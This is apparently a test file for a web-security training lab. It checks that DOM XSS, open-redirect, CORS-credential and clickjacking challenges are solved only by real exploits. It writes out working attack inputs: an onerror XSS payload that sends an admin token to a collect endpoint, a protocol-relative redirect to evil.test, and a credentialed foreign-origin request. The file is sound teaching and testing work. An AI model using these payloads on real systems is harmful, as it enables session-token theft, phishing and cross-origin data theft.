import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startTestApp, CookieClient, type TestApp } from "./helpers.js";
import { expectSolvedOnce, formLogin, launch, newLearner } from "./lab-harness.js";

const simulateAdminVisit = (cp: CookieClient, instanceId: string, path: string) =>
  cp.json<{ ok: boolean; error?: string }>(`/api/instances/${instanceId}/simulate-admin-visit`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ path }),
  });

describe("client-side batch 4", () => {
  let t: TestApp;
  beforeAll(async () => {
    t = await startTestApp({ apiPort: 4150, labPortStart: 7100, labPortEnd: 7140 });
  });
  afterAll(async () => {
    await t.manager.stopAll();
    await t.close();
  });

  it("xss-dom-hash-sink: a plain visit and a harmless fragment never solve it; a script fragment does, via the real admin-bot", async () => {
    const cp = await newLearner(t);
    const lab = await launch(t, "xss-dom-hash-sink", cp);
    const b = lab.browser();
    const xp0 = await lab.xp();

    const plain = await (await b.fetch("/dashboard")).text();
    expect(plain).toContain("No filter applied");
    const harmless = await (await b.fetch("/dashboard#filter=invoices")).text(); // fragment never reaches the server anyway
    expect(harmless).toBe(plain);
    expect(await lab.solved()).toBe(false);

    const ok = await simulateAdminVisit(cp, lab.id, "/dashboard#filter=invoices");
    expect(ok.body.ok).toBe(true);
    expect(await lab.solved()).toBe(false); // a non-exploiting fragment, even via the real admin bot, must not solve it

    const payload = "<img src=x onerror=\"fetch('/collect?token='+document.getElementById('dash').dataset.token)\">";
    const exploit = await simulateAdminVisit(cp, lab.id, "/dashboard#filter=" + encodeURIComponent(payload));
    expect(exploit.body.ok).toBe(true);
    await expectSolvedOnce(lab, "medium", () => simulateAdminVisit(cp, lab.id, "/dashboard#filter=" + encodeURIComponent(payload)), xp0);
    await lab.stop();
  }, 40_000);

  it("open-redirect-login-next: an internal next is honoured; a wrong password never redirects anywhere; a protocol-relative next leaks off-site", async () => {
    const lab = await launch(t, "open-redirect-login-next");
    const xp0 = await lab.xp();

    const normal = await lab.browser().fetch("/login", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: "username=alice&password=practice123&next=%2Flinks", redirect: "manual" });
    expect(normal.status).toBe(302);
    expect(normal.headers.get("location")).toBe("/links");
    const wrongPw = await lab.browser().fetch("/login", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: "username=alice&password=wrong&next=%2F%2Fevil.test", redirect: "manual" });
    expect(wrongPw.status).toBe(302);
    // A failed login redirects back to /login (preserving "next" so the form can retry) — never off-site.
    const wrongPwHost = new URL(wrongPw.headers.get("location")!, `http://127.0.0.1:${lab.port}`).host;
    expect(wrongPwHost).toBe(`127.0.0.1:${lab.port}`);
    expect(await lab.solved()).toBe(false);

    const exploit = await lab.browser().fetch("/login", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: "username=alice&password=practice123&next=" + encodeURIComponent("//evil.test/phish"), redirect: "manual" });
    expect(exploit.status).toBe(302);
    const loc = exploit.headers.get("location")!;
    expect(loc.startsWith("/")).toBe(true); // passed the app's own (flawed) check...
    expect(new URL(loc, "http://attacker-resolves-this.invalid").host).toBe("evil.test"); // ...but a browser sends the user to evil.test
    await expectSolvedOnce(
      lab,
      "easy",
      () => lab.browser().fetch("/login", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: "username=alice&password=practice123&next=" + encodeURIComponent("//evil.test/again"), redirect: "manual" }),
      xp0,
    );
    await lab.stop();
  });

  it("cors-reflect-credentials: the public endpoint is safe; an unauthenticated foreign-origin request alone never solves it; an authenticated one does", async () => {
    const lab = await launch(t, "cors-reflect-credentials");
    const xp0 = await lab.xp();

    const pub = await lab.browser().fetch("/api/public-stats", { headers: { origin: "https://evil.test" } });
    expect(pub.headers.get("access-control-allow-origin")).toBe("*");
    expect(pub.headers.get("access-control-allow-credentials")).toBeNull();

    const anon = await lab.browser().fetch("/api/profile", { headers: { origin: "https://evil.test" } });
    expect(anon.status).toBe(401); // no session: the headers alone (without real data behind them) are not the exploit
    expect(await lab.solved()).toBe(false);

    const sameOrigin = lab.browser();
    await formLogin(sameOrigin, "alice", "practice123");
    const own = await sameOrigin.fetch("/api/profile", { headers: { origin: `http://127.0.0.1:${lab.port}` } });
    expect(own.headers.get("access-control-allow-credentials")).toBe("true"); // the app's own origin legitimately gets credentials
    expect(await lab.solved()).toBe(false);

    const attacker = lab.browser();
    await formLogin(attacker, "alice", "practice123");
    const stolen = await attacker.fetch("/api/profile", { headers: { origin: "https://evil.test" } });
    expect(stolen.status).toBe(200);
    expect(stolen.headers.get("access-control-allow-origin")).toBe("https://evil.test");
    expect(stolen.headers.get("access-control-allow-credentials")).toBe("true");
    expect((await stolen.json()) as { balanceUsd: number }).toMatchObject({ balanceUsd: 4820.5 });
    await expectSolvedOnce(lab, "medium", () => attacker.fetch("/api/profile", { headers: { origin: "https://another-evil.test" } }), xp0);
    await lab.stop();
  });

  it("clickjack-admin-action: visiting the real page directly never solves it; clicking the decoy without the frame does nothing; the framed click fires the real button", async () => {
    const cp = await newLearner(t);
    const lab = await launch(t, "clickjack-admin-action", cp);
    const xp0 = await lab.xp();

    const direct = await simulateAdminVisit(cp, lab.id, "/admin/reset"); // the real admin just looking at the page, no click
    expect(direct.body.ok).toBe(true);
    expect(await lab.solved()).toBe(false);
    expect((await (await lab.browser().fetch("/votes-reset-status")).json()) as { votesReset: boolean }).toEqual({ votesReset: false });

    const safeDecoy = await simulateAdminVisit(cp, lab.id, "/attacker/demo-safe"); // decoy exists but nothing is framed beneath it
    expect(safeDecoy.body.ok).toBe(true);
    expect(await lab.solved()).toBe(false);
    expect((await (await lab.browser().fetch("/votes-reset-status")).json()) as { votesReset: boolean }).toEqual({ votesReset: false });

    const res = await simulateAdminVisit(cp, lab.id, "/attacker/demo");
    expect(res.body.ok).toBe(true);
    expect((await (await lab.browser().fetch("/votes-reset-status")).json()) as { votesReset: boolean }).toEqual({ votesReset: true });
    await expectSolvedOnce(lab, "medium", () => simulateAdminVisit(cp, lab.id, "/attacker/demo"), xp0);
    await lab.stop();
  }, 40_000);
});
